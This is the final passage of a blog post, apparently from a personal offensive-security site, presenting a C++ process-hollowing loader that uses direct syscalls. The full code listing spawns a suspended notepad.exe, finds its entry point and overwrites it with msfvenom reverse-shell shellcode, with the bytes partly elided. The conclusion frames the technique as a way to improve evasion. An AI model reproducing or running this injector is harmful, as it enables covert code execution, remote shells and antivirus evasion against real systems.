<p>With that, we should have a complete program. If we compile and run, we should see the <code>notepad.exe</code> process running our shellcode.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311154727245.png"></p>
<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>In this post, we demonstrated the Process Hollowing technique which can be used to enhance our evasion capabilities. Our shellcode is easily signatured since it’s from <code>msfvenom</code>, but can be encrypted for further evasion.</p>
<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><details>
<summary> Full Code </summary>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;syscall_common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;internals.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Create process to be hollowed out - notepad.exe</span></span><br><span class="line">	LPSTARTUPINFOA si = <span class="keyword">new</span> <span class="built_in">STARTUPINFOA</span>(); <span class="comment">// pointer to a STARTUPINFO struct</span></span><br><span class="line">	LPPROCESS_INFORMATION pi = <span class="keyword">new</span> <span class="built_in">PROCESS_INFORMATION</span>(); <span class="comment">// pointer to a PROCESS_INFORMATION struct</span></span><br><span class="line">	<span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;notepad.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, si, pi);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get process ID</span></span><br><span class="line">	DWORD pid = pi-&gt;dwProcessId;</span><br><span class="line">	HANDLE hProcess = pi-&gt;hProcess;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Created notepad.exe process ID at: %d\r\n&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Calculate PEB and image base offset</span></span><br><span class="line">	PROCESS_BASIC_INFORMATION* pbi = <span class="keyword">new</span> <span class="built_in">PROCESS_BASIC_INFORMATION</span>();</span><br><span class="line">	ULONG retLen = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">NtQueryInformationProcess</span>(hProcess, ProcessBasicInformation, pbi, <span class="built_in">sizeof</span>(PROCESS_BASIC_INFORMATION), &amp;retLen);</span><br><span class="line">	PINT ImageBaseOffset = (PINT)((INT64)pbi-&gt;PebBaseAddress + <span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Image Base Offset found at: %p\r\n&quot;</span>, ImageBaseOffset);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Read address of image base</span></span><br><span class="line">	PINT lpImageBaseAddress = <span class="number">0</span>;</span><br><span class="line">	SIZE_T bytesRead = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">NtReadVirtualMemory</span>(hProcess, ImageBaseOffset, &amp;lpImageBaseAddress, <span class="built_in">sizeof</span>(lpImageBaseAddress), &amp;bytesRead);</span><br><span class="line">	<span class="comment">//printf(&quot;[+] Read %lld bytes\r\n&quot;, bytesRead);</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Image Base Address found at: %p\r\n&quot;</span>, lpImageBaseAddress);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Read 0x200 bytes from the base image</span></span><br><span class="line">	CHAR data[<span class="number">0x200</span>];</span><br><span class="line">	SIZE_T bytesRead1 = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">NtReadVirtualMemory</span>(hProcess, lpImageBaseAddress, &amp;data, <span class="built_in">sizeof</span>(data), &amp;bytesRead1);</span><br><span class="line">	<span class="comment">//printf(&quot;[+] Read %lld bytes from base image\r\n&quot;, bytesRead1);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Extract the e_lfanew offset at 0x3C - this should hold the address value to the start of the PE header</span></span><br><span class="line">	<span class="type">char</span> extractedBytes[<span class="number">4</span>];</span><br><span class="line">	<span class="built_in">memcpy</span>(extractedBytes, data + <span class="number">0x3C</span>, <span class="number">4</span>);</span><br><span class="line">	<span class="type">int</span> extractedInteger = *<span class="built_in">reinterpret_cast</span>&lt;<span class="type">int</span>*&gt;(extractedBytes);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] e_lfanew offset at: 0x%x\r\n&quot;</span>, extractedInteger);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Add 0x28 to get to the offset of the entrypoint RVA.</span></span><br><span class="line">	<span class="type">int</span> opthdr = extractedInteger + <span class="number">0x28</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Entrypoint RVA offset found at: %x\r\n&quot;</span>, opthdr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Extract entrypoint RVA value</span></span><br><span class="line">	<span class="type">char</span> entrypoint[<span class="number">4</span>];</span><br><span class="line">	<span class="built_in">memcpy</span>(entrypoint, data + opthdr, <span class="number">4</span>);</span><br><span class="line">	<span class="type">int</span> entrypoint_rva = *<span class="built_in">reinterpret_cast</span>&lt;<span class="type">int</span>*&gt;(entrypoint);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Entrypoint RVA value found at: %x\r\n&quot;</span>, entrypoint_rva);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get entrypoint address</span></span><br><span class="line">	PINT addressOfEntryPoint = (PINT)(entrypoint_rva + (INT64)lpImageBaseAddress);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Entrypoint Address found at: %p\r\n&quot;</span>, addressOfEntryPoint);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// msfvenom -p windows/x64/shell_reverse_tcp LHOST=4444 -f c</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line">		<span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;</span></span><br><span class="line">		<span class="string">&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span></span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">	SIZE_T nnRead = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(hProcess, addressOfEntryPoint, buf, <span class="built_in">sizeof</span>(buf), &amp;nnRead);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Wrote %lld bytes to entry point\r\n&quot;</span>, nnRead);</span><br><span class="line">	<span class="built_in">ResumeThread</span>(pi-&gt;hThread);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Thread resumed. Shellcode executed\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</details>

<hr>
<p>References:<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Portable_Executable">https://en.wikipedia.org/wiki/Portable_Executable</a><br><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations">https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations</a><br><a target="_blank" rel="noopener" href="https://github.com/m0n0ph1/Process-Hollowing/tree/master/sourcecode/ProcessHollowing">https://github.com/m0n0ph1/Process-Hollowing/tree/master/sourcecode/ProcessHollowing</a><br><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/012/">https://attack.mitre.org/techniques/T1055/012/</a><br><a target="_blank" rel="noopener" href="https://github.com/jthuraisamy/SysWhispers2">https://github.com/jthuraisamy/SysWhispers2</a></p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/posts/backdooring-pe-files/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
              2024-03-11 15:56:54
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/Malware/" title="Malware">
                        #Malware
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Theory"><span class="toc-text">Theory</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Setting-up-Our-Environment"><span class="toc-text">Setting up Our Environment</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MASM-Build-Customization"><span class="toc-text">MASM Build Customization</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Importing-SysWhisphers2"><span class="toc-text">Importing SysWhisphers2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Include-ASM-File-to-Build"><span class="toc-text">Include ASM File to Build</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process-Hollowing"><span class="toc-text">Process Hollowing</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Create-Process-in-Suspended-State"><span class="toc-text">Create Process in Suspended State</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-EntryPoint-Address"><span class="toc-text">Getting EntryPoint Address</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Manually-Getting-the-EntryPoint-in-WinDbg"><span class="toc-text">Manually Getting the EntryPoint in WinDbg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-the-EntryPoint-with-Code"><span class="toc-text">Getting the EntryPoint with Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overwriting-the-Memory"><span class="toc-text">Overwriting the Memory</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Code"><span class="toc-text">Code</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/kagehayashi">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/kagehayashi">Copyright © 2024 KageHayashi</a>
        
    </div>
  
    
    <div class="footer-more">
      
        ▰▰▰
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        

      </div>
    </div>
  </body>
</html>
